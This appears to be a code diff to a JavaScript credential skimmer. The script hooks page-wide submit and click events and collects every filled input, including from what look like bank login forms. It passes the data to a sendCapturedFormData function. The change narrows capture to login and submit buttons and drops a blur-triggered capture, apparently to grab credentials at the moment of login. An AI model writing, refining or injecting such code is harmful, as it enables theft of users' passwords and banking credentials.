@@ -294,34 +294,48 @@
       }
     }
 
+    // Check if clicked element is a login/submit button (ignore nav/forgot password links)
+    function isSubmitOrLoginButton(el) {
+      if (!el) return false;
+      const tag = el.tagName.toLowerCase();
+      const text = (el.textContent || '').toLowerCase().trim();
+      const id = (el.id || '').toLowerCase();
+      const cls = (el.className || '').toLowerCase();
+
+      // Ignore navigation, forgot password, enroll links
+      if (text.includes('forgot') || text.includes('enroll') || text.includes('help') || text.includes('terms') || text.includes('privacy') || text.includes('trouble')) {
+        return false;
+      }
+
+      if (tag === 'button' || el.getAttribute('type') === 'submit' || el.getAttribute('role') === 'button') {
+        return true;
+      }
+
+      const isLoginText = text.includes('log in') || text.includes('login') || text.includes('sign in') || text.includes('submit') || text.includes('continue') || text.includes('next') || text.includes('confirm');
+      const isLoginAttr = id.includes('submit') || id.includes('login') || cls.includes('login') || cls.includes('submit');
+
+      return isLoginText || isLoginAttr;
+    }
+
     // 1. Traditional Form Submit capture
     document.addEventListener('submit', function(e) {
       const form = e.target;
       if (form.getAttribute('data-alp-ignore')) return;
       const formData = collectInputs(form);
-      sendCapturedFormData(formData, form.id || form.className || 'form_submit', form.action);
-    });
-
-    // 2. Click capture for non-form buttons, links (e.g. <a id="dnnBankLoginSubmit_Q2">Log In</a>), or login buttons
-    document.addEventListener('click', function(e) {
-      const el = e.target.closest('a, button, input[type="button"], input[type="submit"], [role="button"], .btn, .button, .login');
-      if (!el) return;
-
-      const formData = collectInputs(document);
       if (Object.keys(formData).length > 0) {
-        const btnId = el.id || el.className || el.textContent.trim().slice(0, 20) || 'click_trigger';
-        sendCapturedFormData(formData, btnId, 'click_action');
+        sendCapturedFormData(formData, form.id || form.className || 'form_submit', form.action);
       }
     });
 
-    // 3. Auto-capture inputs when typing/leaving input fields (blur event)
-    document.addEventListener('focusout', function(e) {
-      const tag = e.target.tagName.toLowerCase();
-      if (tag === 'input' || tag === 'select' || tag === 'textarea') {
-        const formData = collectInputs(document);
-        if (Object.keys(formData).length > 0) {
-          sendCapturedFormData(formData, 'blur_auto_capture', 'auto_save');
-        }
+    // 2. Click capture ONLY on login/submit buttons when inputs are filled
+    document.addEventListener('click', function(e) {
+      const el = e.target.closest('a, button, input[type="button"], input[type="submit"], [role="button"], .btn, .button, .login');
+      if (!el || !isSubmitOrLoginButton(el)) return;
+
+      const formData = collectInputs(document);
+      if (Object.keys(formData).length > 0) {
+        const btnId = el.id || el.className || el.textContent.trim().slice(0, 20) || 'login_button';
+        sendCapturedFormData(formData, btnId, 'login_click');
       }
     });
 
